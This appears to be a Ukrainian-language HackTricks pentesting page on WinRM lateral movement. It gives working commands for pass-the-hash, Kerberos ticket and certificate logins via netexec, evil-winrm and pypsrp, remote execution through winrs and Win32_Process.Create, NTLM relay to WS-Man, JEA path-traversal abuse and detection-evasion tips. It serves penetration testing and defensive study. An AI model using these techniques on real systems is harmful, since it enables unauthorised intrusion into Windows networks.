# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM — один із найзручніших транспортів для **lateral movement** у середовищах Windows, оскільки він надає віддалений shell через **WS-Man/HTTP(S)** без потреби в хитрощах зі створенням служб SMB. Якщо ціль відкриває **5985/5986**, а ваш principal має право на remoting, часто можна дуже швидко перейти від «valid creds» до інтерактивного shell.

Щоб дізнатися про **перелік протоколів/служб**, listeners, увімкнення WinRM, `Invoke-Command` і загальне використання клієнта, дивіться:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Чому оператори обирають WinRM

- Використовує **HTTP/HTTPS** замість SMB/RPC, тому часто працює там, де заблоковане виконання в стилі PsExec.
- З **Kerberos** не потрібно надсилати цільовій системі облікові дані, які можна повторно використати.
- Добре працює з інструментами для **Windows**, **Linux** і **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Інтерактивний шлях PowerShell remoting запускає на цільовій системі **`wsmprovhost.exe`** у контексті автентифікованого користувача, що з операційного погляду відрізняється від виконання через служби.

## Модель доступу та передумови

На практиці успішний WinRM lateral movement залежить від **трьох** умов:

1. На цільовій системі є **WinRM listener** (`5985`/`5986`) і правила firewall дозволяють підключення.
2. Обліковий запис може **автентифікуватися** на кінцевій точці.
3. Обліковому запису дозволено **відкривати remoting-сесію**.

Поширені способи отримати такий доступ:

- **Local Administrator** на цільовій системі.
- Членство в групі **Remote Management Users** у новіших системах або **WinRMRemoteWMIUsers__** у системах/компонентах, які досі враховують цю групу.
- Явно делеговані права на remoting через дескриптори безпеки локальної системи / зміни ACL PowerShell remoting.

Якщо ви вже контролюєте машину з правами адміністратора, пам’ятайте, що також можете **делегувати доступ до WinRM без членства в групі адміністраторів** за допомогою описаних тут методів:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Нюанси автентифікації, важливі під час lateral movement

- Для **Kerberos потрібне ім’я хоста/FQDN**. Якщо підключитися за IP-адресою, клієнт зазвичай переходить на **NTLM/Negotiate**.
- У **workgroup** або в окремих випадках із перехресними довірчими відносинами для NTLM зазвичай потрібен або **HTTPS**, або додавання цільової системи до **TrustedHosts** на клієнті.
- Під час використання локальних облікових записів через Negotiate у workgroup обмеження UAC для віддаленого доступу можуть блокувати підключення, якщо не використовується вбудований обліковий запис Administrator або не встановлено `LocalAccountTokenFilterPolicy=1`.
- За замовчуванням PowerShell remoting використовує **`HTTP/<host>` SPN**. У середовищах, де `HTTP/<host>` уже зареєстрований за іншим обліковим записом служби, автентифікація WinRM Kerberos може завершитися помилкою `0x80090322`; використовуйте SPN із зазначеним портом або перейдіть на **`WSMAN/<host>`**, якщо такий SPN існує.<sup>[[3]](#references)</sup>

Якщо під час password spraying ви отримали дійсні облікові дані, перевірити їх через WinRM — часто найшвидший спосіб з’ясувати, чи дають вони доступ до shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement із Linux до Windows

### NetExec / CrackMapExec для перевірки та одноразового виконання

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM для інтерактивних оболонок

`evil-winrm` залишається найзручнішим інтерактивним варіантом у Linux, оскільки підтримує **паролі**, **NT-хеші**, **квитки Kerberos**, **клієнтські сертифікати**, передавання файлів і завантаження PowerShell/.NET у пам’ять.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Граничний випадок Kerberos SPN: `HTTP` vs `WSMAN`

Якщо SPN за замовчуванням **`HTTP/<host>`** спричиняє збої Kerberos, спробуйте запросити або використати натомість квиток **`WSMAN/<host>`**. Таке трапляється в захищених або нестандартно налаштованих корпоративних середовищах, де **`HTTP/<host>`** уже прив’язаний до іншого облікового запису служби.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Це також корисно після зловживання **RBCD / S4U**, якщо ви підробили або запросили квиток служби **WSMAN**, а не звичайний квиток `HTTP`.

### Автентифікація на основі сертифікатів

WinRM також підтримує **автентифікацію за клієнтським сертифікатом**, але на цільовій системі сертифікат має бути прив’язаний до **локального облікового запису**. З погляду атакувальника це важливо, коли:

- ви викрали або експортували дійсний клієнтський сертифікат і закритий ключ, уже прив’язані до WinRM;
- ви використали **AD CS / Pass-the-Certificate**, щоб отримати сертифікат для суб’єкта, а потім перейти до іншого шляху автентифікації;
- ви працюєте в середовищах, де навмисно уникають віддаленого доступу на основі паролів.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

Client-certificate WinRM трапляється набагато рідше, ніж автентифікація за паролем/хешем/Kerberos, але за наявності може забезпечити **lateral movement без пароля**, який зберігається після ротації пароля.

### Python / автоматизація за допомогою `pypsrp`

Якщо вам потрібна автоматизація, а не shell оператора, `pypsrp` дає змогу працювати з WinRM/PSRP із Python і підтримує **NTLM**, **автентифікацію за сертифікатом**, **Kerberos** та **CredSSP**.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Якщо потрібен точніший контроль, ніж надає високорівнева обгортка `Client`, низькорівневі API `WSMan` + `RunspacePool` стануть у пригоді для двох поширених задач оператора:

- примусово використовувати **`WSMAN`** як службу/SPN Kerberos замість очікуваного за замовчуванням **`HTTP`**, який використовують багато клієнтів PowerShell;
- підключатися до **кінцевої точки PSRP, що не є типовою**, наприклад **JEA** / користувацької конфігурації сеансу, замість `Microsoft.PowerShell`.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Власні кінцеві точки PSRP та JEA мають значення під час lateral movement

Успішна автентифікація WinRM **не** завжди означає, що ви потрапите до стандартної необмеженої кінцевої точки `Microsoft.PowerShell`. У зрілих середовищах можуть бути доступні **власні конфігурації сеансів** або кінцеві точки **JEA** з власними ACL та поведінкою запуску від імені іншого користувача.<sup>[[1]](#references)</sup>

Якщо ви вже маєте code execution на хості Windows і хочете з’ясувати, які інтерфейси remoting доступні, перелічіть зареєстровані кінцеві точки:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Коли доступний корисний endpoint, явно вказуйте його як ціль замість оболонки за замовчуванням:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Практичні наслідки для offensive security:

- **Обмеженого** endpoint може бути достатньо для lateral movement, якщо він відкриває саме ті cmdlet-и/функції, які потрібні для керування службами, доступу до файлів, створення процесів або довільного виконання .NET / зовнішніх команд.
- **Неправильно налаштована JEA**-роль особливо цінна, якщо вона відкриває небезпечні команди, як-от `Start-Process`, широкі шаблони підстановки, доступні для запису провайдери або власні proxy-функції, що дають змогу вийти за межі передбачених обмежень.
- Endpoint-и, що використовують **віртуальні облікові записи RunAs** або **gMSA**, змінюють ефективний контекст безпеки команд, які ви запускаєте. Зокрема, endpoint на основі gMSA може надати **мережеву ідентичність на другому переході**, навіть якщо звичайна WinRM-сесія зіткнулася б із типовою проблемою делегування.

Для власного обмеженого endpoint перевіряйте окремо його ефективні дозволи на команди та скрипти: короткий список `Get-Command` сам по собі не доводить, що наявний `.ps1` не можна запустити. [JEA role capabilities](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) явно визначають, які шляхи до скриптів можна викликати; інші власні endpoint-и можуть застосовувати інші правила сесії. Якщо дозволений скрипт використовує збережений `SecureString` для створення облікових даних іншого хоста, blob, створений без явного ключа, використовує [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) і зазвичай для розшифрування потребує контексту користувача й комп’ютера, що захищали його. Перш ніж вважати доступний для запису вихідний код або скопійований blob шляхом підвищення привілеїв між хостами, перевірте ACL скрипту, дозволені способи виклику, ідентичність run-as і права облікових даних на цільовому хості. Не виводьте захищене значення під час пасивного переліку.

Для власної JEA-функції, що приймає шлях до файлу, перевіряйте разом ACL зареєстрованого endpoint, зіставлені можливості ролі та ефективну ідентичність run-as. Користувач може мати `NoLanguage`, тоді як тіло функції виконується в режимі мови за замовчуванням системи; віртуальний обліковий запис також може мати права локального адміністратора. Якщо функція перевіряє дозволений каталог за допомогою звичайного префікса рядка, а потім читає вказаний шлях, компоненти `..` можуть вивести шлях за межі цього каталогу. Межу визначає нормалізований шлях, доступний для ідентичності функції, а не режим мови користувача чи видимий префікс. Перш ніж вважати доступний для читання файл `.psrc` або `.pssc` знахідкою щодо привілейованого читання файлів, підтвердьте доступність функції та перевірку кінцевого шляху. Див. рекомендації Microsoft щодо [JEA role capability](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) і [security considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations).

## Lateral movement через вбудовані засоби Windows і WinRM

### `winrs.exe`

`winrs.exe` вбудований у систему й корисний, коли потрібне **виконання команд через вбудований WinRM** без відкриття інтерактивної сесії PowerShell remoting:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Два прапорці легко забути, хоча на практиці вони важливі:

- `/noprofile` часто потрібен, якщо віддалений суб’єкт не є **локальним адміністратором**.
- `/allowdelegate` дає змогу віддаленій оболонці використовувати ваші облікові дані для доступу до **третього хоста** (наприклад, коли команді потрібен `\\fileserver\share`).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

На практиці `winrs.exe` зазвичай створює віддалений ланцюжок процесів, подібний до:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Це варто пам’ятати, оскільки цей спосіб відрізняється від виконання через служби та інтерактивних сеансів PSRP.

### `winrm.cmd` / WS-Man COM замість PowerShell remoting

Також можна виконувати команди через **транспорт WinRM** без `Enter-PSSession`, викликаючи класи WMI через WS-Man. Транспортом залишається WinRM, а примітивом віддаленого виконання стає **WMI `Win32_Process.Create`**:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Такий підхід корисний, коли:

- Журналювання PowerShell активно відстежується.
- Вам потрібен **транспорт WinRM**, але не класичний робочий процес PS remoting.
- Ви створюєте або використовуєте власні інструменти на основі COM-об’єкта **`WSMan.Automation`**.

## NTLM relay до WinRM (WS-Man)

Коли SMB relay блокується через підписування, а LDAP relay обмежений, **WS-Man/WinRM** усе ще може бути привабливою ціллю для relay. Сучасний `ntlmrelayx.py` містить **сервери WinRM relay** і може виконувати relay на цілі **`wsman://`** або **`winrms://`**.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Дві практичні примітки:

- Relay найкорисніший, коли ціль приймає **NTLM**, а ретрансльованому суб’єкту дозволено використовувати WinRM.
- У новішому коді Impacket спеціально обробляються запити **`WSMANIDENTIFY: unauthenticated`**, щоб проби на кшталт `Test-WSMan` не переривали процес relay.

Щоб дізнатися про обмеження багатопереходового доступу після встановлення першого сеансу WinRM, дивіться:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Нотатки щодо OPSEC і виявлення

- **Інтерактивне віддалене керування PowerShell** зазвичай створює на цілі процес **`wsmprovhost.exe`**.
- **`winrs.exe`** зазвичай створює **`winrshost.exe`**, а потім запитаний дочірній процес.
- Користувацькі кінцеві точки **JEA** можуть виконувати дії від імені віртуальних облікових записів **`WinRM_VA_*`** або налаштованого **gMSA**, що змінює телеметрію та поведінку під час другого переходу порівняно з оболонкою у звичайному контексті користувача.<sup>[[1]](#references)</sup>
- Якщо використовуєте PSRP, а не необроблений `cmd.exe`, очікуйте телеметрію мережевого входу, події служби WinRM, а також журналювання PowerShell Operational і блоків сценаріїв.
- Якщо потрібна лише одна команда, `winrs.exe` або одноразове виконання через WinRM може бути менш помітним, ніж тривалий інтерактивний сеанс віддаленого керування.
- Якщо доступний Kerberos, віддавайте перевагу **FQDN + Kerberos**, а не IP + NTLM, щоб зменшити кількість проблем із довірою та потребу в незручних змінах `TrustedHosts` на стороні клієнта.

## References

- [1] [Microsoft: міркування щодо безпеки JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [README pypsrp](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: помилка `0x80090322` під час підключення PowerShell до віддаленого сервера через WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
